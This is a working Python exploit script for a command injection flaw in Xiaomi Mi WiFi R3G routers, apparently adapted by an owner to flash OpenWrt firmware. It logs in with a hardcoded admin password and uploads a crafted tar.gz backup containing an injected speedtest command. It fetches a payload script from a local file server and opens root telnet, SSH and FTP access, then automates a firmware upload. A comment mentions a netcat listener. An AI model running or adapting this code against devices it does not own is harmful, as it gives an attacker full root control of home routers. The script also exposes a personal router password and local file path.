#!/usr/bin/python
# There is a remote command execution vulnerability in Xiaomi Mi WiFi R3G before version stable 2.28.23.
# The backup file is in tar.gz format. After uploading, the application uses the tar zxf command to decompress,
# so you can control the contents of the files in the decompressed directory.
# In addition, the application's sh script for testing upload and download speeds will read the url list from /tmp/speedtest_urls.xml,
# and there is a command injection vulnerability.

# discoverer: UltramanGaia from Kap0k & Zhiniang Peng from Qihoo 360 Core Security

# HOW TO RUN
# Install requirements
# pip3 install -r requirements.txt
# Run the script
# python3 remote_command_execution_vulnerability.py

import os
import shutil
import tarfile
import requests
import sys
import re
import time
import random
import hashlib
import threading

router_ip_address="192.168.31.1"
#router_ip_address = "miwifi.com"
#router_ip_address = input("Router IP address [press enter for using the default '{}']: ".format(router_ip_address)) or router_ip_address

# get stok
def get_stok(router_ip_address):
    try: 
        r0 = requests.get("http://{router_ip_address}/cgi-bin/luci/web".format(router_ip_address=router_ip_address))
    except:
        print ("Xiaomi router not found...")
        return None
    try:	
        mac = re.findall(r'deviceId = \'(.*?)\'', r0.text)[0]
    except:
        print ("Xiaomi router not found...")
        return None
    key = re.findall(r'key: \'(.*)\',', r0.text)[0]
    nonce = "0_" + mac + "_" + str(int(time.time())) + "_" + str(random.randint(1000, 10000))
    router_password = "northman98"
    #router_password = input("Enter router admin password: ")
    account_str = hashlib.sha1((router_password + key).encode('utf-8')).hexdigest()
    password = hashlib.sha1((nonce + account_str).encode('utf-8')).hexdigest()
    data = "username=admin&password={password}&logtype=2&nonce={nonce}".format(password=password,nonce=nonce)
    r1 = requests.post("http://{router_ip_address}/cgi-bin/luci/api/xqsystem/login".format(router_ip_address=router_ip_address), 
        data = data, 
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"})
    try:
        stok = re.findall(r'"token":"(.*?)"',r1.text)[0]
    except:
        print("Failed to get stok in login response '{}'".format(r1.text))
        return None
    return stok

stok = get_stok(router_ip_address) or input("You need to get the stok manually, then input the stok here: ")
print("""There two options to provide the files needed for invasion:
   1. Use a local TCP file server runing on random port to provide files in local directory `script_tools`.
   2. Download needed files from remote github repository. (choose this option only if github is accessable inside router device.)""")
use_local_file_server = True  # Automatically use option 1
#use_local_file_server = (input("Which option do you prefer? (default: 1)") or "1") == "1"

# From https://blog.securityevaluators.com/show-mi-the-vulns-exploiting-command-injection-in-mi-router-3-55c6bcb48f09
# In the attacking machine (macos), run the following before executing this script: /usr/bin/nc -l 4444
command = "((sh /tmp/script.sh exploit) &)"

# proxies = {"http":"http://127.0.0.1:8080"}
proxies = {}

if os.path.exists("build"):
    shutil.rmtree("build")
os.makedirs("build")

# make config file
speed_test_filename = "speedtest_urls.xml"
with open("speedtest_urls_template.xml", "rt", encoding = "UTF-8") as f:
    template = f.read()
data = template.format(router_ip_address=router_ip_address, command=command)
# print(data)
with open("build/speedtest_urls.xml", "wt", encoding = "UTF-8", newline = "\n") as f:
    f.write(data)

print("****************")
print("router_ip_address: " + router_ip_address)
print("stok: " + stok)
print("file provider: " + ("local file server" if use_local_file_server else "remote github repository"))
print("****************")

# Make tar
with tarfile.open("build/payload.tar.gz", "w:gz") as tar:
    tar.add("build/speedtest_urls.xml", "speedtest_urls.xml")
    tar.add("script.sh")
    # tar.add("busybox")
    # tar.add("extras/wget")
    # tar.add("extras/xiaoqiang")

# upload config file
print("start uploading config file...")
r1 = requests.post(
    "http://{}/cgi-bin/luci/;stok={}/api/misystem/c_upload".format(router_ip_address, stok),
    files={"image": open("build/payload.tar.gz", 'rb')},
    proxies=proxies
)
# print(r1.text)

def send_test_netspeed_request(router_ip_address, stok, port):
    r = requests.get(
        "http://{}/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed?{}".format(router_ip_address, stok, port),
        proxies=proxies
    )
    # print(r.text)

# exec download speed test, exec command
print("start exec command...")
if use_local_file_server:
    from tcp_file_server import TcpFileServer
    file_server = TcpFileServer("script_tools")

    with file_server:
        # The TCP file server will use a random port number.
        # And this port number will be sent to the router luci web server through query parameters of testing net speed request here.
        # Then in the injected `script.sh`, we can get the client IP address and file server port
        # through CGI variables `REMOTE_ADDR` and `QUERY_STRING` to download needed files.
        send_test_netspeed_request(router_ip_address, stok, file_server.port)
else:  # Use remote github repository. port setted to 0.
    send_test_netspeed_request(router_ip_address, stok, port=0)

print("done! Now you can connect to the router using several options: (user: root, password: root)")
print("* telnet {}".format(router_ip_address))
print("* ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc -o UserKnownHostsFile=/dev/null root@{}".format(router_ip_address))
print("* ftp: using a program like cyberduck")

# Automatically open new command prompt and run telnet on Windows
import platform
if platform.system() == "Windows":
    import subprocess
    print("\nOpening new command prompt with telnet connection...")
    try:
        # Create a PowerShell script that can handle telnet interaction
        ps_script = f"""
$process = Start-Process -FilePath "telnet" -ArgumentList "{router_ip_address}" -PassThru -NoNewWindow
Start-Sleep -Seconds 3
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait("root")
[System.Windows.Forms.SendKeys]::SendWait("{{ENTER}}")
"""
        
        # Write PowerShell script to file
        with open("telnet_auto.ps1", "w") as f:
            f.write(ps_script)
        
        # Open new cmd window and run telnet directly
        subprocess.Popen(["cmd", "/k", "telnet", router_ip_address], 
                        creationflags=subprocess.CREATE_NEW_CONSOLE)
        
        print("New command prompt opened with telnet {} command".format(router_ip_address))
        print("Login credentials: root/root")
        print("Note: You'll need to manually type 'root' at the login prompt")
        print("Tip: You can copy 'root' and paste it at the login prompt")

        # Prepare and open another cmd window to upload firmware via FTP to /tmp
        firmware_path = r"C:\Users\rahma\Documents\openwrt\4C\openwrt-22.03.3-ramips-mt76x8-xiaomi_mi-router-4c-squashfs-sysupgrade.bin"
        ftp_script = f"""open {router_ip_address}
root
root
binary
cd /tmp
put "{firmware_path}"
bye
"""
        with open("ftp_upload.txt", "w", encoding="utf-8") as f:
            f.write(ftp_script)
        subprocess.Popen(["cmd", "/k", "ftp", "-s:ftp_upload.txt"],
                         creationflags=subprocess.CREATE_NEW_CONSOLE)
        print("Opened another command prompt to run FTP upload to /tmp as root/root.")
        
        # Schedule SSH setup script to run after 4 minutes
        def run_ssh_setup_after_delay():
            print(f"\nWaiting 4 minutes before running SSH setup script...")
            time.sleep(240)  # 4 minutes = 240 seconds
            print("Executing SSH setup script...")
            try:
                subprocess.run(["python", "ssh_router_setup.py"], check=True)
                print("SSH setup script completed successfully!")
            except subprocess.CalledProcessError as e:
                print(f"SSH setup script failed with error: {e}")
            except FileNotFoundError:
                print("Error: ssh_router_setup.py not found in current directory")
            except Exception as e:
                print(f"Unexpected error running SSH setup script: {e}")
        
        # Start the scheduled task in a separate thread
        ssh_scheduler = threading.Thread(target=run_ssh_setup_after_delay, daemon=True)
        ssh_scheduler.start()
        print("Scheduled SSH setup script to run in 4 minutes...")
        
    except Exception as e:
        print("Failed to open command prompt: {}".format(e))
else:
    print("\nOn non-Windows systems, manually run: telnet {}".format(router_ip_address))
    print("Login credentials: root/root")
